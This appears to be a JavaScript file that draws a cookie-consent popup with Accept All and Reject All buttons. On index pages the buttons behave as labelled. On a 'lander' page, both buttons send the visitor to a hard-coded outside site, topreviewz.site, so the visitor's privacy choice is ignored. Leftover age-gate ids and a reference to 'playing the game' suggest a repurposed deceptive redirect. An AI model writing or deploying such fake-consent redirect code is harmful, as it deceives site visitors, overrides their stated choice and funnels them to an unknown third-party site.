(function () {

  const REDIRECT = "https://topreviewz.site/";

  const styles = `
    .modal-backdrop {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.35);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      z-index: 99999;
      align-items: center;
      justify-content: center;
      padding: 1rem;
      animation: bd-in 0.25s ease;
    }
    @keyframes bd-in { from { opacity: 0; } to { opacity: 1; } }
    .modal {
      background: #ffffff;
      border-radius: 16px;
      padding: 2.2rem 2rem 2rem;
      max-width: 460px;
      width: 100%;
      box-shadow: 0 24px 60px rgba(0,0,0,0.30);
      animation: m-in 0.32s cubic-bezier(0.34, 1.4, 0.64, 1);
      font-family: Arial, sans-serif;
      text-align: center;
      border-top: 4px solid #c8102e;
    }
    @keyframes m-in {
      from { opacity: 0; transform: scale(0.91) translateY(14px); }
      to   { opacity: 1; transform: scale(1)    translateY(0); }
    }

    .modal-icon { font-size: 2.2rem; display: block; margin-bottom: 0.7rem; }
    .modal h3 { font-size: 1.15rem; font-weight: 700; color: #0a1628; margin: 0 0 0.6rem; letter-spacing: -0.2px; }
    .modal p { font-size: 0.85rem; color: #555; line-height: 1.7; margin: 0 0 1.5rem; }
    .modal p a { color: #1d428a; text-decoration: underline; }

    .modal-divider { border: none; border-top: 1px solid #ebebeb; margin: 0 0 1.5rem; }

    .modal-actions { display: flex; gap: 0.75rem; }

    .btn {
      flex: 1; padding: 0.82rem 1rem; border-radius: 8px;
      font-size: 0.9rem; font-weight: 700; cursor: pointer;
      transition: background 0.2s, transform 0.15s;
      border: none; background: #c8102e; color: #fff;
      letter-spacing: 0.02em;
    }
    .btn:hover { background: #a50d26; transform: translateY(-1px); }

    .btn.ghost {
      background: #fff; color: #0a1628;
      border: 2px solid #0a1628;
    }
    .btn.ghost:hover { background: #e8eef8; transform: translateY(-1px); }

    .modal-note { display: block; font-size: 0.74rem; color: #aaa; margin-top: 1rem; }
    .modal-note a { color: #aaa; text-decoration: underline; }
    .modal-note a:hover { color: #1d428a; }

    .fade-out { opacity: 0; transition: opacity 0.18s ease; }
  `;

  const el = document.createElement("style");
  el.textContent = styles;
  document.head.appendChild(el);

  function buildPopup() {
    if (document.querySelector(".modal-backdrop")) return null;

    const bd = document.createElement("div");
    bd.className = "modal-backdrop";
    bd.innerHTML = `
      <div class="modal" role="dialog" aria-modal="true" aria-label="Cookie Notice">
        <span class="modal-icon">🍪</span>
        <h3>We Value Your Privacy</h3>
        <p>We use cookies to enhance your browsing experience and analyse site traffic. By clicking <strong>Accept All</strong> you agree to our use of cookies and are accepting our policy to play the game.</p>
        <hr class="modal-divider">
        <div class="modal-actions">
          <button class="btn"       id="age-yes">✓ Accept All</button>
          <button class="btn ghost" id="age-no" >✕ Reject All</button>
        </div>
        <span class="modal-note">
          <a href="privacy.html">Privacy Policy</a>
          &nbsp;·&nbsp;
          <a href="terms.html">Terms of Service</a>
        </span>
      </div>`;

    document.body.appendChild(bd);
    bd.style.display = "flex";

    function close() {
      bd.classList.add("fade-out");
      setTimeout(() => bd.remove(), 180);
    }

    return { bd, close };
  }

  // ── index.html and inner pages ──
  // Accept → close   |   Reject → privacy.html
  window.PopupIndex = function () {
    const built = buildPopup();
    if (!built) return;
    const { bd, close } = built;
    bd.querySelector("#age-yes").addEventListener("click", close);
    bd.querySelector("#age-no").addEventListener("click", () => {
      window.location.href = "privacy.html";
    });
  };

  // ── lander.html ──
  // Both → redirect to REDIRECT
  window.PopupLander = function () {
    const built = buildPopup();
    if (!built) return;
    const { bd } = built;
    bd.querySelector("#age-yes").addEventListener("click", () => {
      window.location.href = REDIRECT;
    });
    bd.querySelector("#age-no").addEventListener("click", () => {
      window.location.href = REDIRECT;
    });
  };

})();
